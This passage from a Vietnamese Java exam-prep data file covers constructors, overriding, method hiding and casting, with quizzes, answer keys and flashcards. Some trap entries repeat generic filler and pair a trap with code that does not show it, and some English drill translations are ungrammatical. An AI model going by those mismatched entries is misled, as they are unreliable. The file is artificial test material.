          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "class Parent {\n    Parent(String name) {} // Có constructor có tham số\n}\n\nclass Child extends Parent {\n    // Child() {} // COMPILE ERROR: Parent() không tồn tại!\n    Child() {\n        super(\"Default\"); // Phải gọi tường minh dòng đầu tiên!\n    }\n}",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        },
        {
          "trap": "Cạm bẫy 2: Không thể gọi đồng thời cả `this()` và `super()` trong cùng 1 constructor.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "class Parent {\n    Parent(String name) {} // Có constructor có tham số\n}\n\nclass Child extends Parent {\n    // Child() {} // COMPILE ERROR: Parent() không tồn tại!\n    Child() {\n        super(\"Default\"); // Phải gọi tường minh dòng đầu tiên!\n    }\n}",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Cơ chế hoạt động của finally",
          "questions": [
            {
              "q": "Có trường hợp nào mà khối `finally` KHÔNG được thực thi không?",
              "ans": "Có! Khi hàm `System.exit(0)` được gọi trong khối try/catch, hoặc khi JVM bị crash đột ngột (ví dụ OutOfMemoryError phần cứng, ngắt nguồn điện OS)."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Return overwrite trong khối finally",
          "questions": [
            {
              "q": "Tại sao không nên đặt lệnh `return` hoặc ném ngoại lệ trong khối `finally`?",
              "ans": "Vì câu lệnh `return` hoặc `throw` trong `finally` sẽ triệt tiêu và ghi đè hoàn toàn (overwrite/swallow) giá trị trả về hoặc ngoại lệ đang được xử lý ở khối `try` hoặc `catch`, dẫn đến mất dấu vết lỗi và sai lệch logic chương trình."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace luồng return với finally",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\npublic static int test() {\n    int x = 10;\n    try {\n        return x;\n    } finally {\n        x = 20;\n    }\n}\n```\nKhi gọi hàm `test()`, giá trị trả về là bao nhiêu?",
              "ans": "Trả về: 10! Giải thích: Khi gặp `return x;` trong `try`, giá trị của `x` (10) được sao chép và lưu vào một ô nhớ tạm trên Stack (return slot). Sau đó khối `finally` chạy gán `x = 20` (chỉ làm thay đổi biến cục bộ `x`), không làm thay đổi giá trị trong return slot. Do đó hàm vẫn trả về 10."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy return ghi đè trong finally",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\npublic static int test() {\n    try {\n        return 1;\n    } finally {\n        return 2;\n    }\n}\n```\nHàm trả về bao nhiêu?",
              "ans": "Trả về 2! Khi khối `finally` có lệnh `return 2;` tường minh, nó ghi đè trực tiếp lên giá trị `1` trước đó của khối try."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "Try-with-resources và Suppressed Exceptions",
          "questions": [
            {
              "q": "Trong cú pháp try-with-resources (Java 7+), các tài nguyên được đóng theo thứ tự nào so với thứ tự khai báo?",
              "ans": "Các tài nguyên được tự động đóng (`close()`) theo THỨ TỰ NGƯỢC LẠI (LIFO - Last-In, First-Out) so với thứ tự khai báo trong dấu ngoặc tròn `try(...)`."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_10_1",
          "q": "Nguyên lý đóng gói (Encapsulation) trong Java được thực thi chuẩn mực nhất bằng cách nào?",
          "options": [
            "Khai báo các thuộc tính là private và cung cấp các getter/setter public",
            "Khai báo tất cả các thuộc tính là public",
            "Khai báo tất cả các class là final",
            "Sử dụng kế thừa nhiều tầng"
          ],
          "correct": 0,
          "exp": "Encapsulation (Đóng gói) là việc che giấu dữ liệu trạng thái nội bộ bằng private fields và chỉ cho phép truy cập/kiểm soát thông qua các phương thức getter/setter public theo chuẩn JavaBeans."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Quy tắc gọi Constructor cha (`super()`) trong Constructor con?",
          "a": "`super()` hoặc `this()` PHẢI là câu lệnh đầu tiên trong constructor con. Không được gọi cả hai trong cùng 1 constructor. Nếu lập trình viên không tự viết, compiler sẽ tự động chèn `super()` không tham số vào dòng đầu tiên.",
          "trap": "Nếu class cha khai báo constructor có tham số và KHÔNG có constructor mặc định, lớp con không tự gọi `super(args)` sẽ bị Compile Error ngay!"
        },
        {
          "q": "Nguyên lý đóng gói (Encapsulation) chuẩn trong Java được thiết kế như thế nào?",
          "a": "Khai báo các thuộc tính (fields) là `private` để giấu dữ liệu bên trong, và cung cấp các phương thức `public` getter / setter để kiểm soát việc đọc/ghi và xác thực dữ liệu hợp lệ.",
          "trap": "Getter trả về con trỏ Mutable Object (như `Date` hoặc mảng) cần clone để tránh lộ tham chiếu trực tiếp ra ngoài."
        },
        {
          "q": "Constructor có được kế thừa (inherited) sang lớp con không?",
          "a": "KHÔNG. Lớp con không kế thừa constructor của lớp cha, nó chỉ có thể gọi (invoke) constructor của lớp cha thông qua từ khóa `super(...)`.",
          "trap": "Nhiều người lầm tưởng constructor cũng được kế thừa như method thông thường."
        }
      ],
      "dailyEnglish": [
        {
          "id": 28,
          "vi": "Bạn vui lòng nhập định dạng giờ không lớn hơn 24",
          "en": "Please input hour format without greater than 24"
        },
        {
          "id": 29,
          "vi": "Nếu trường thành phố và trường tên không rỗng thì tìm kiếm theo 2 điều kiện trên",
          "en": "If fields of city and name are not null, search by 2 above conditions"
        },
        {
          "id": 30,
          "vi": "Nếu trường thành phố, năm và tên  rỗng thì hiện tất cả các danh sách từ bảng Trainer.",
          "en": "If fields of city, year and name are null, show all lists from Trainer table"
        },
        {
          "id": 31,
          "vi": "Kiễm tra khi click nút xóa thì sẽ hiện lên bảng thông báo",
          "en": "Check if clicking button DELETE, show on NOTICE"
        },
        {
          "id": 32,
          "vi": "Set giá trị cho biến bị lỗi ở class không tìm thấy",
          "en": "Set values for undefined variables at invisible CLASS"
        }
      ],
      "chapter": "Chapter 5: OOP - Encapsulation & Inheritance"
    },
    "11": {
      "day": 11,
      "week": 2,
      "title": "Chapter 5: OOP - Polymorphism, Overloading vs Overriding",
      "topics": [
        "Polymorphism: Compile-time type vs Runtime object type",
        "Method Overloading: compile-time resolution, method signature (tên + tham số)",
        "Method Overriding rules: cùng tên, cùng tham số, return type tương thích, access modifier không được hẹp hơn, không được throw checked exception mới/rộng hơn"
      ],
      "tasks": [
        "Lập bảng so sánh chi tiết Overloading vs Overriding",
        "Tự vẽ sơ đồ polymorphic dispatch"
      ],
      "englishDrill": [
        {
          "id": 31,
          "vi": "Kiễm tra khi click nút xóa thì sẽ hiện lên bảng thông báo",
          "en": "Check if clicking button DELETE, show on NOTICE"
        },
        {
          "id": 32,
          "vi": "Set giá trị cho biến bị lỗi ở class không tìm thấy",
          "en": "Set values for undefined variables at invisible CLASS"
        },
        {
          "id": 33,
          "vi": "Định nghĩa form từ action",
          "en": "Define Form from ACTION"
        },
        {
          "id": 34,
          "vi": "Đặt giá trị cho biến",
          "en": "Assign values to variables"
        },
        {
          "id": 35,
          "vi": "Khởi tạo đối tượng connection",
          "en": "Initialize connection object"
        }
      ],
      "summary": "Chapter 5: OOP - Polymorphism, Overloading vs Overriding.",
      "coreTheory": "\n### 1. Overloading (Nạp chồng phương thức)\n- Cùng class, cùng tên, **danh sách tham số BẮT BUỘC PHẢI KHÁC NHAU** (số lượng, kiểu dữ liệu, thứ tự).\n- Kiểu trả về và access modifier có thể giống hoặc khác. Phân giải tại thời điểm biên dịch (Compile-time).\n\n### 2. Overriding (Ghi đè phương thức)\n- Quan hệ kế thừa cha-con, cùng tên, **cùng danh sách tham số**.\n- **4 Quy tắc vàng:**\n  1. Access modifier không được hẹp hơn cha (cha protected -> con protected hoặc public).\n  2. Kiểu trả về phải giống hệt hoặc là kiểu con (Covariant Return Type).\n  3. Không được ném Checked Exception mới hoặc rộng hơn cha.\n  4. Phân giải tại thời điểm thực thi (Runtime Polymorphism).\n",
      "codeSnippet": "class Animal {\n    protected Number getAge() throws IOException { return 5; }\n}\nclass Dog extends Animal {\n    // Hợp lệ: public rộng hơn protected, Integer là con của Number\n    public Integer getAge() { return 3; }\n}",
      "traps": [
        "Thuộc tính (fields) và static methods KHÔNG có tính đa hình, chỉ bị che khuất (hiding).",
        "Con ném exception rộng hơn cha bị lỗi biên dịch."
      ],
      "quickQuiz": [
        {
          "q": "Phương thức cha là public thì phương thức con override có thể để protected không?",
          "a": "Không, vì protected hẹp hơn public."
        }
      ],
      "estimatedTime": "3h 30m",
      "difficulty": "⭐⭐⭐⭐",
      "priority": "🔴 MUST KNOW (Trọng Tâm Số 1 Của SCJP & Audit FPT)",
      "source": "SCJP Chapter 5 (Ch05.pdf) & TestKing",
      "objectives": [
        "Thuộc lòng 4 quy tắc vàng khi Override phương thức.",
        "Hiểu sâu tính năng Covariant Return Type từ Java 5 (kiểu con trả về kiểu con).",
        "Phân biệt Method Overriding (Dynamic dispatch tại Runtime) vs Method Overloading (Static binding tại Compile-time).",
        "Giải thích hiện tượng Method Hiding khi khai báo phương thức static ở cả class cha và con."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "partA",
          "title": "Part A: 4 Quy Tắc Vàng Của Method Overriding",
          "sourceRef": "SCJP Objective 5.2 (Ch05.pdf, Page 12-28)",
          "theory": "\nKhi class con ghi đè phương thức từ class cha, compiler kiểm tra nghiêm ngặt 4 quy tắc:\n\n#### 1. Quy tắc Danh sách Tham số (Argument List):\n- Danh sách tham số phải **GIỐNG HỆT 100%** phương thức cha (cùng số lượng, cùng kiểu dữ liệu, cùng thứ tự).\n- Nếu khác tham số $\\rightarrow$ Biến thành **Overloading** chứ không phải Overriding!\n\n#### 2. Quy tắc Kiểu Trả Về (Return Type - Covariant Return):\n- Từ Java 5 trở đi, kiểu trả về của method con có thể là **Covariant Return Type** (nghĩa là cùng kiểu hoặc là một **kiểu con** của kiểu trả về ở cha).\n- Ví dụ: Cha trả về `Object`, con có thể trả về `String`. Cha trả về `Animal`, con có thể trả về `Dog`.\n\n#### 3. Quy tắc Quyền Truy Cập (Access Level):\n- Quyền truy cập của con **TUYỆT ĐỐI KHÔNG ĐƯỢC HẸP HƠN** cha:\n  - Cha là `public` $\\to$ Con bắt buộc phải là `public`.\n  - Cha là `protected` $\\to$ Con có thể là `protected` hoặc `public` (không được `default` hay `private`).\n  - Cha là `default` $\\to$ Con có thể là `default`, `protected`, hoặc `public`.\n\n#### 4. Quy tắc Ngoại Lệ (Exception Rule):\n- Con **KHÔNG ĐƯỢC NÉM RA** ngoại lệ Checked mới hoặc rộng hơn cha!\n- Con có thể: Không throw gì cả, hoặc chỉ throw ngoại lệ con hẹp hơn, hoặc throw bất kỳ Unchecked Exception nào (RuntimeException).\n",
          "code": "class Animal {\n    protected Animal reproduce() throws Exception {\n        return new Animal();\n    }\n    public static void test() { System.out.println(\"Animal static\"); }\n}\n\nclass Dog extends Animal {\n    // Override hợp lệ với Covariant return (Dog là con Animal) và thu hẹp Exception!\n    @Override\n    public Dog reproduce() throws java.io.IOException {\n        return new Dog();\n    }\n    \n    // Method Hiding: Không phải override!\n    public static void test() { System.out.println(\"Dog static\"); }\n}"
        },
        {
          "id": "partB",
          "title": "Part B: Method Hiding & Đa Hình Runtime",
          "sourceRef": "SCJP Objective 5.2 (Ch05.pdf, Page 30-40)",
          "theory": "\n#### 1. Tại sao không thể Override static method?\n- Trong Java, phương thức `static` được liên kết tĩnh tại thời điểm biên dịch (**Compile-time Binding**) dựa vào **kiểu của biến tham chiếu**.\n- Nếu cả cha và con cùng định nghĩa `public static void doWork()`, đây gọi là **Method Hiding (Ẩn phương thức)**.\n- Khi gọi `Animal a = new Dog(); a.doWork();` $\\to$ JVM sẽ chạy hàm của `Animal` (dựa trên kiểu biến tham chiếu lúc compile), hoàn toàn không có tính đa hình Runtime!\n\n#### 2. Đa hình phương thức instance (Dynamic Method Dispatch):\n- Khi gọi `Animal a = new Dog(); a.makeSound();` (với makeSound là instance method) $\\to$ JVM sẽ tra cứu trên Heap và chạy hàm của đối tượng thực tế `Dog` lúc Runtime!\n",
          "code": "Animal a = new Dog();\na.test(); // IN RA: \"Animal static\" (Method Hiding - chạy theo kiểu biến Animal!)\na.reproduce(); // Chạy hàm của Dog (Đa hình Runtime!)"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_d11_1",
          "level": "Hard",
          "question": "Chương trình sau in ra kết quả gì?",
          "code": "class Parent {\n    int x = 10;\n    void print() { System.out.print(\"P:\" + x + \" \"); }\n}\nclass Child extends Parent {\n    int x = 20;\n    void print() { System.out.print(\"C:\" + x + \" \"); }\n}\npublic class PolyTest {\n    public static void main(String[] args) {\n        Parent p = new Child();\n        System.out.print(p.x + \" \");\n        p.print();\n    }\n}",
          "options": [
            "10 C:20 ",
            "20 C:20 ",
            "10 P:10 ",
            "20 P:10 "
          ],
          "correctIndex": 0,
          "explanation": "1. Trong Java, **thuộc tính (fields) KHÔNG CÓ ĐA HÌNH** (Field Shadowing). Biểu thức `p.x` được phân giải tại compile-time theo kiểu của biến tham chiếu `Parent`, do đó `p.x` lấy giá trị `10`.\n2. Ngược lại, **phương thức (methods) có tính Đa Hình Runtime**. Lời gọi `p.print()` sẽ thực thi phiên bản của đối tượng thực tế trên Heap là `Child`, in ra `C:20 `.\n-> Kết quả in ra: `10 C:20 `."
        }
      ],
      "examTraps": [
        {
          "trap": "Thuộc tính (Variables) không có tính Đa hình (Polymorphism)",
          "whyPeopleWrong": "Tưởng rằng cả biến và phương thức đều được đa hình lúc runtime.",
          "wrongThinking": "Nghĩ rằng Parent p = new Child(); p.x sẽ lấy giá trị x của Child.",
          "correctRule": "Đa hình trong Java CHỈ ÁP DỤNG CHO INSTANCE METHODS. Việc truy cập biến tham chiếu (fields) luôn dựa vào kiểu khai báo của biến tại Compile-time.",
          "code": "Parent p = new Child();\nSystem.out.println(p.x); // Luôn lấy x của Parent!",
          "miniCheck": "Thấy truy cập thuộc tính .x trên biến cha trỏ con thì kết quả luôn là giá trị ở class Cha!"
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Nguyên lý kế thừa và ghi đè phương thức",
          "questions": [
            {
              "q": "Khi ghi đè (override) một phương thức, phạm vi truy cập của phương thức ở class con có được hẹp hơn class cha không?",
              "ans": "Không! Phương thức ở class con BẮT BUỘC phải có phạm vi truy cập BẰNG HOẶC RỘNG HƠN phương thức ở class cha (vd: cha là `protected` thì con phải là `protected` hoặc `public`)."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Quy tắc Covariant Return Type",
          "questions": [
            {
              "q": "Covariant Return Type trong Java là gì?",
              "ans": "Từ Java 5, phương thức override ở class con được phép có kiểu trả về là một lớp con (sub-type) của kiểu trả về ở class cha (ví dụ cha trả về `Number`, con được phép override trả về `Integer`)."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace Đa hình Runtime (Dynamic Binding)",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nclass Parent {\n    void show() { System.out.print(\"P \"); }\n}\nclass Child extends Parent {\n    void show() { System.out.print(\"C \"); }\n}\npublic class Test {\n    public static void main(String[] args) {\n        Parent obj = new Child();\n        obj.show();\n    }\n}\n```\nKết quả in ra là gì?",
              "ans": "In ra: `C `. Do `obj` thực tế trỏ tới đối tượng `Child` trên Heap, cơ chế Dynamic Binding (đa hình lúc runtime) sẽ gọi phương thức được ghi đè tại class `Child`."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy che giấu phương thức static (Method Hiding)",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nclass A { static void m() { System.out.print(\"A \"); } }\nclass B extends A { static void m() { System.out.print(\"B \"); } }\npublic class Test {\n    public static void main(String[] args) {\n        A obj = new B();\n        obj.m();\n    }\n}\n```\nKết quả in ra là gì?",
              "ans": "In ra: `A `. Phương thức `static` KHÔNG tham gia vào đa hình runtime, mà áp dụng cơ chế Method Hiding (liên kết tĩnh lúc compile - Static Binding dựa trên kiểu tham chiếu `A`)."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "Bẫy biến instance không đa hình (Variable Shadowing)",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nclass Parent { int x = 10; }\nclass Child extends Parent { int x = 20; }\npublic class Test {\n    public static void main(String[] args) {\n        Parent p = new Child();\n        System.out.println(p.x);\n    }\n}\n```\nKết quả in ra là gì?",
              "ans": "In ra: 10. Các trường biến (fields) trong Java KHÔNG có tính đa hình! Việc truy cập biến luôn được quyết định bởi kiểu của tham chiếu (`Parent`) tại thời điểm biên dịch."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_11_1",
          "q": "Class Cha khai báo: `protected void doStuff() throws IOException`. Class Con khai báo nào sau đây là OVERRIDE HỢP LỆ?",
          "options": [
            "public void doStuff()",
            "void doStuff() throws IOException",
            "protected void doStuff() throws Exception",
            "private void doStuff()"
          ],
          "correct": 0,
          "exp": "Quyền truy cập của con có thể mở rộng thành 'public' (rộng hơn protected) và con có quyền không ném ngoại lệ nào cả. Phương án 2 bị lỗi vì quyền default hẹp hơn protected; phương án 3 bị lỗi vì ném Exception rộng hơn IOException."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Sự khác biệt cốt lõi giữa Overloading (Nạp chồng) và Overriding (Ghi đè)?",
          "a": "- Overloading: Cùng tên trong cùng class, KHÁC danh sách tham số, quyết định ở Compile-time.\n- Overriding: Cùng tên và cùng tham số ở lớp con, quyết định ở Runtime dựa vào đối tượng thực tế trên Heap.",
          "trap": "Thay đổi kiểu trả về nhưng giữ nguyên tham số KHÔNG PHẢI là overloading mà bị Compile Error!"
        },
        {
          "q": "Quy tắc Covariant Return Type trong Method Overriding từ Java 5?",
          "a": "Phương thức ghi đè ở lớp con có thể trả về kiểu con của kiểu trả về ở lớp cha. Ví dụ: Cha trả về `Object`, con có thể trả về `String`. Nhưng áp dụng cho kiểu tham chiếu, không áp dụng cho primitive.",
          "trap": "Cha trả về `double`, con đổi sang `int` là Compile Error (primitive không có tính covariant)!"
        },
        {
          "q": "Các ràng buộc về Access Modifier và Exception khi Override phương thức?",
          "a": "- Access Modifier ở con phải RỘNG HƠN hoặc BẰNG cha (vd: protected -> public hoặc protected; không được đổi sang private).\n- Con KHÔNG ĐƯỢC ném Checked Exception mới hoặc rộng hơn cha (nhưng có thể ném ít hơn hoặc ném Unchecked Exception tùy ý).",
          "trap": "Cha không throws gì cả, con throws Exception -> Compile Error ngay!"
        }
      ],
      "dailyEnglish": [
        {
          "id": 31,
          "vi": "Kiễm tra khi click nút xóa thì sẽ hiện lên bảng thông báo",
          "en": "Check if clicking button DELETE, show on NOTICE"
        },
        {
          "id": 32,
          "vi": "Set giá trị cho biến bị lỗi ở class không tìm thấy",
          "en": "Set values for undefined variables at invisible CLASS"
        },
        {
          "id": 33,
          "vi": "Định nghĩa form từ action",
          "en": "Define Form from ACTION"
        },
        {
          "id": 34,
          "vi": "Đặt giá trị cho biến",
          "en": "Assign values to variables"
        },
        {
          "id": 35,
          "vi": "Khởi tạo đối tượng connection",
          "en": "Initialize connection object"
        }
      ],
      "chapter": "Chapter 5: OOP - Polymorphism & Overriding Rules"
    },
    "12": {
      "day": 12,
      "week": 2,
      "title": "Chapter 5: OOP - Advanced Concepts",
      "topics": [
        "Variable Shadowing & Method Hiding (static method)",
        "Casting objects: Upcasting vs Downcasting",
        "ClassCastException at runtime vs Compile error"
      ],
      "tasks": [
        "Phân biệt: override method vs hide static method",
        "Thực hành các câu hỏi casting đối tượng"
      ],
      "englishDrill": [
        {
          "id": 34,
          "vi": "Đặt giá trị cho biến",
          "en": "Assign values to variables"
        },
        {
          "id": 35,
          "vi": "Khởi tạo đối tượng connection",
          "en": "Initialize connection object"
        },
        {
          "id": 36,
          "vi": "Câu truy vấn sql không thực hiện được",
          "en": "SQL  statement can not be executed"
        },
        {
          "id": 37,
          "vi": "Lấy danh sách theo điều kiện gán",
          "en": "Get list by assigning condition"
        },
        {
          "id": 38,
          "vi": "Set giá trị cho biến từ danh sách được lấy từ db",
          "en": "Assign values to variabes from list in database"
        }
      ],
      "summary": "Chapter 5: OOP Nâng Cao - Static Method Hiding, Upcasting & Downcasting.",
      "coreTheory": "\n### 1. Static Method Hiding\n- Phương thức `static` không thể bị override, chỉ bị ẩn (Hidden).\n- Lời gọi static method thông qua biến tham chiếu phụ thuộc vào **Reference Type lúc compile** chứ không phải đối tượng runtime!\n\n### 2. Ép kiểu Đối tượng (Casting)\n- **Upcasting (Ép kiểu lên):** Luôn an toàn, tự động ngầm định (`Animal a = new Dog();`).\n- **Downcasting (Ép kiểu xuống):** Phải ép kiểu tường minh (`Dog d = (Dog) a;`). Nếu object thực tế không phải kiểu con, sẽ ném **`ClassCastException`** lúc chạy.\n",
      "codeSnippet": "Animal a = new Animal();\n// Dog d = (Dog) a; // Biên dịch được nhưng ném ClassCastException lúc runtime!\n\nAnimal a2 = new Dog();\nif (a2 instanceof Dog) {\n    Dog d2 = (Dog) a2; // An toàn tuyệt đối!\n}",
      "traps": [
        "instanceof trả về false nếu đối tượng kiểm tra là null.",
        "Gọi static method qua object null không bị NullPointerException vì compiler chuyển thành gọi qua Class."
      ],
      "quickQuiz": [
        {
          "q": "Biểu thức `null instanceof Object` trả về gì?",
          "a": "false"
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐",
      "priority": "🔴 MUST KNOW (Java Core Cốt Lõi)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
        "Nắm vững toàn diện lý thuyết chuyên sâu về: Variable Shadowing & Method Hiding (static method), Casting objects: Upcasting vs Downcasting, ClassCastException at runtime vs Compile error.",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "\n### 1. Static Method Hiding\n- Phương thức `static` không thể bị override, chỉ bị ẩn (Hidden).\n- Lời gọi static method thông qua biến tham chiếu phụ thuộc vào **Reference Type lúc compile** chứ không phải đối tượng runtime!\n\n### 2. Ép kiểu Đối tượng (Casting)\n- **Upcasting (Ép kiểu lên):** Luôn an toàn, tự động ngầm định (`Animal a = new Dog();`).\n- **Downcasting (Ép kiểu xuống):** Phải ép kiểu tường minh (`Dog d = (Dog) a;`). Nếu object thực tế không phải kiểu con, sẽ ném **`ClassCastException`** lúc chạy.\n",
          "code": "Animal a = new Animal();\n// Dog d = (Dog) a; // Biên dịch được nhưng ném ClassCastException lúc runtime!\n\nAnimal a2 = new Dog();\nif (a2 instanceof Dog) {\n    Dog d2 = (Dog) a2; // An toàn tuyệt đối!\n}"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_d12_1",
          "level": "Hard",
          "question": "Dự đoán kết quả in ra của đoạn code kế thừa và che khuất biến sau:",
          "code": "class Base {\n    int num = 10;\n    void show() { System.out.print(num + \" \"); }\n}\nclass Sub extends Base {\n    int num = 20;\n    void show() { System.out.print(num + \" \"); }\n}\npublic class PolymorphTest {\n    public static void main(String[] args) {\n        Base b = new Sub();\n        System.out.print(b.num + \" \");\n        b.show();\n    }\n}",
          "options": [
            "10 20 ",
            "20 20 ",
            "10 10 ",
            "Compile Error"
          ],
          "correctIndex": 0,
          "explanation": "1. Trong Java, thuộc tính (field) KHÔNG có tính đa hình (Polymorphism). Truy cập `b.num` được quyết định ở thời điểm biên dịch dựa vào kiểu tham chiếu `Base`, do đó in ra `10`.\n2. Phương thức `b.show()` có tính đa hình runtime, tại thời điểm chạy nó gọi phương thức đã được override của đối tượng thực tế `Sub`, do đó in ra `20`.\nKết quả in ra: `10 20 `."
        }
      ],
      "examTraps": [
        {
          "trap": "Class con bị Compile Error do Class cha không có constructor không đối số",
          "whyPeopleWrong": "Nghĩ rằng class con extends cha sẽ tự chạy được.",
          "wrongThinking": "Quên rằng dòng đầu tiên của constructor con luôn ngầm định gọi super();.",
          "correctRule": "Nếu class cha tự viết constructor có tham số và không có constructor rỗng, class con bắt buộc phải gọi tường minh super(args); ở dòng đầu tiên, nếu không sẽ bị lỗi: implicit super constructor is undefined!",
          "code": "class Parent { Parent(int x) {} }\nclass Child extends Parent {\n    // Child() {} // COMPILE ERROR: Không tìm thấy Parent()!\n    Child() { super(10); } // HỢP LỆ\n}",
          "miniCheck": "Kiểm tra class cha có constructor rỗng hay không khi class con kế thừa."
        },
        {
          "trap": "Cạm bẫy 1: instanceof trả về false nếu đối tượng kiểm tra là null.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "Animal a = new Animal();\n// Dog d = (Dog) a; // Biên dịch được nhưng ném ClassCastException lúc runtime!\n\nAnimal a2 = new Dog();\nif (a2 instanceof Dog) {\n    Dog d2 = (Dog) a2; // An toàn tuyệt đối!\n}",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        },
        {
          "trap": "Cạm bẫy 2: Gọi static method qua object null không bị NullPointerException vì compiler chuyển thành gọi qua Class.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "Animal a = new Animal();\n// Dog d = (Dog) a; // Biên dịch được nhưng ném ClassCastException lúc runtime!\n\nAnimal a2 = new Dog();\nif (a2 instanceof Dog) {\n    Dog d2 = (Dog) a2; // An toàn tuyệt đối!\n}",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Constructor và từ khóa this/super",
          "questions": [
            {
              "q": "Lời gọi `this()` hoặc `super()` nếu xuất hiện trong constructor thì bắt buộc phải nằm ở vị trí nào?",
              "ans": "Bắt buộc phải nằm ở DÒNG ĐẦU TIÊN của constructor."
            },
            {
              "q": "Một constructor có thể gọi đồng thời cả `this()` và `super()` không?",
              "ans": "Không thể, vì cả hai đều bắt buộc phải nằm ở dòng đầu tiên của constructor, dẫn đến xung đột cú pháp."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Thứ tự khởi tạo đối tượng trong JVM",
          "questions": [
            {
              "q": "Trình bày thứ tự khởi tạo của JVM khi một đối tượng lớp con được tạo mới (`new Child()`).",
              "ans": "1) Static variables & Static init blocks của cha rồi đến con (chạy 1 lần duy nhất khi nạp class). 2) Instance variables & Instance init blocks của cha -> Constructor cha. 3) Instance variables & Instance init blocks của con -> Constructor con."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace thứ tự thực thi Constructor và Init Blocks",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nclass Parent {\n    static { System.out.print(\"S1 \"); }\n    {\n        System.out.print(\"I1 \");\n    }\n    Parent() { System.out.print(\"C1 \"); }\n}\nclass Child extends Parent {\n    static { System.out.print(\"S2 \"); }\n    {\n        System.out.print(\"I2 \");\n    }\n    Child() { System.out.print(\"C2 \"); }\n}\npublic class Test {\n    public static void main(String[] args) {\n        new Child();\n    }\n}\n```\nKết quả in ra màn hình là gì?",
              "ans": "In ra: `S1 S2 I1 C1 I2 C2`. Thứ tự:\n1) Khối static cha `S1` -> static con `S2`.\n2) Khối instance cha `I1` -> Constructor cha `C1`.\n3) Khối instance con `I2` -> Constructor con `C2`."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy thiếu constructor mặc định ở class cha",
          "questions": [
            {
              "q": "Class con bị Compile Error khi class cha khai báo `Parent(String name) {}` mà không có constructor rỗng, tại sao?",
              "ans": "Khi class cha tự định nghĩa một constructor có tham số, Java sẽ KHÔNG tự sinh constructor mặc định không tham số nữa. Class con nếu không gọi tường minh `super(\"name\")` sẽ ngầm định gọi `super()`, dẫn tới Compile Error: `implicit super constructor Parent() is undefined`."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "Gọi overridable method trong constructor",
          "questions": [
            {
